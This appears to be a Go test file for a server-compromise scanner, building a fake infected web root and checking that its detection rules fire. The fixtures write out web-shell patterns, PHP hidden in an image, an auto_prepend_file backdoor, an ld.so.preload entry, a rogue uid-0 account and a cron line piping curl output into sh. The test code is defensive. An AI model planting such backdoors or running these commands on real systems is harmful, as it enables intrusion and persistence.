package trace

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Fixtures are built at test time and are inert: every dangerous call sits
// behind `if (false)` and the "payloads" decode to the word "test". They
// exist only to exercise the signatures.
const inert = "<?php /* bastion test fixture — inert */ if (false) { "

func put(t *testing.T, root, p, content string, mtime time.Time) {
	t.Helper()
	full := filepath.Join(root, p)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	if !mtime.IsZero() {
		os.Chtimes(full, mtime, mtime)
	}
}

func fixture(t *testing.T) (string, time.Time) {
	root := t.TempDir()
	now := time.Date(2026, 10, 22, 12, 0, 0, 0, time.UTC)
	recent := now.Add(-48 * time.Hour)
	put(t, root, "etc/os-release", "ID=debian\nVERSION_ID=12\nPRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\n", time.Time{})
	put(t, root, "etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ntoor:x:0:0::/root:/bin/bash\n", time.Time{})
	put(t, root, "etc/nginx/sites-enabled/site", "server {\n  root /srv/site/public;\n  access_log /var/log/nginx/site.access.log;\n}\n", time.Time{})
	put(t, root, "srv/site/public/index.php", "<?php echo 'hello';\n", recent)
	put(t, root, "srv/site/public/wp-content/uploads/2026/10/cache.php", inert+"eval(base64_decode('dGVzdA==')); }\n", recent)
	put(t, root, "srv/site/public/lib/helper.php", inert+"$_POST['a']($_POST['b']); }\n", recent)
	put(t, root, "srv/site/public/img/logo.png", "\x89PNG\r\n\x1a\n<?php /* inert */ ?>", recent)
	put(t, root, "srv/site/public/.user.ini", "auto_prepend_file = /srv/site/public/img/logo.png\n", recent)
	put(t, root, "srv/site/public/blob.php", "<?php $x = '"+strings.Repeat("QUJD", 1000)+"';\n", recent)
	put(t, root, "srv/site/public/vendor/legit.php", "<?php function f($a) { return array_map('trim', $a); }\n", recent)
	put(t, root, "var/spool/cron/crontabs/www-data", "*/5 * * * * curl -fsSL http://example.invalid/x | sh\n", recent)
	put(t, root, "etc/ld.so.preload", "/usr/lib/libhide.so\n", recent)
	put(t, root, "var/log/nginx/site.access.log",
		"203.0.113.9 - - [21/Oct/2026:10:00:00 +0000] \"POST /wp-content/uploads/2026/10/cache.php HTTP/1.1\" 200 12 \"-\" \"x\"\n"+
			"203.0.113.9 - - [21/Oct/2026:10:01:00 +0000] \"GET /lib/helper.php?cmd=whoami HTTP/1.1\" 200 3 \"-\" \"x\"\n"+
			"198.51.100.1 - - [01/Jan/2020:10:01:00 +0000] \"GET /old.php?cmd=whoami HTTP/1.1\" 200 3 \"-\" \"x\"\n", recent)
	put(t, root, "var/log/php8.2-fpm.log",
		"[21-Oct-2026 09:59:58] WARNING: [pool www] child 4242 exited on signal 11 (SIGSEGV) after 12.5 seconds from start\n"+
			"[21-Oct-2026 09:59:59] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 65536 bytes) in Unknown on line 0\n", recent)
	return root, now
}

func TestTraceFixture(t *testing.T) {
	root, now := fixture(t)
	res, err := Run(context.Background(), Options{SysRoot: root, Now: now, Since: 30 * 24 * time.Hour}, "test")
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != VerdictCompromised {
		t.Fatalf("verdict %s", res.Verdict)
	}
	byRule := map[string][]Finding{}
	for _, f := range res.Findings {
		byRule[f.Rule] = append(byRule[f.Rule], f)
	}
	for _, want := range []string{"php.eval-decoded", "php.request-callable", "file.php-in-image", "config.auto-prepend", "persist.cron", "persist.ld-preload", "persist.uid0", "log.flagged-file-access", "log.post-upload-php", "log.command-param", "log.worker-crash", "log.early-oom"} {
		if len(byRule[want]) == 0 {
			t.Errorf("missing finding %s", want)
		}
	}
	for _, f := range res.Findings {
		if strings.Contains(f.Path, "vendor/legit.php") || strings.HasSuffix(f.Path, "index.php") {
			t.Errorf("false positive on %s: %s", f.Path, f.Rule)
		}
		if f.Rule == "log.command-param" && f.Count != 1 {
			t.Errorf("old log line outside --since was counted: %d", f.Count)
		}
	}
	if len(res.Webroots) != 1 || res.Webroots[0].Path != "/srv/site/public" {
		t.Errorf("webroots %+v", res.Webroots)
	}
	if res.Findings[0].Severity != High {
		t.Error("findings not sorted by severity")
	}
	for i := 1; i < len(res.Timeline); i++ {
		if res.Timeline[i].Time.Before(res.Timeline[i-1].Time) {
			t.Fatal("timeline not sorted")
		}
	}
}

func TestCleanTree(t *testing.T) {
	root := t.TempDir()
	put(t, root, "var/www/html/index.php", "<?php\nrequire __DIR__.'/vendor/autoload.php';\necho htmlspecialchars($_GET['q'] ?? '');\n", time.Time{})
	put(t, root, "etc/passwd", "root:x:0:0:root:/root:/bin/bash\n", time.Time{})
	// Stock php.ini: empty directives followed by commented lines.
	put(t, root, "etc/php/8.3/fpm/php.ini", "; https://php.net/auto-prepend-file\nauto_prepend_file =\n\n; https://php.net/auto-append-file\nauto_append_file =\n", time.Time{})
	put(t, root, "var/www/html/.user.ini", "auto_prepend_file = '/var/www/html/wordfence-waf.php'\n", time.Time{})
	res, err := Run(context.Background(), Options{SysRoot: root}, "test")
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != VerdictClean {
		t.Fatalf("%s %+v", res.Verdict, res.Findings)
	}
	for _, f := range res.Findings {
		if f.Severity != Info {
			t.Errorf("unexpected %s finding %s at %s", f.Severity, f.Rule, f.Path)
		}
	}
}

func TestParseLogTime(t *testing.T) {
	now := time.Date(2026, 10, 22, 0, 0, 0, 0, time.UTC)
	cases := map[string]string{
		`1.2.3.4 - - [21/Oct/2026:10:00:00 +0000] "GET /"`:                 "2026-10-21T10:00:00Z",
		`2026/10/21 10:00:00 [error] 12#12: *1 FastCGI sent in stderr`:     "2026-10-21T10:00:00Z",
		`[21-Oct-2026 10:00:00] WARNING: [pool www] child 1 exited`:        "2026-10-21T10:00:00Z",
		`[Tue Oct 21 10:00:00.123456 2026] [core:notice] [pid 1] AH00052:`: "2026-10-21T10:00:00Z",
		`Oct 21 10:00:00 web kernel: php-fpm8.2[1]: segfault at 0`:         "2026-10-21T10:00:00Z",
		`2026-10-21T10:00:00+00:00 web kernel: x`:                          "2026-10-21T10:00:00Z",
	}
	for line, want := range cases {
		if got := parseLogTime(line, now).UTC().Format(time.RFC3339); got != want {
			t.Errorf("%q: got %s want %s", line, got, want)
		}
	}
}

func TestRulesCompile(t *testing.T) {
	rules, err := LoadRules()
	if err != nil {
		t.Fatal(err)
	}
	if len(rules) < 10 {
		t.Fatal("too few rules")
	}
}
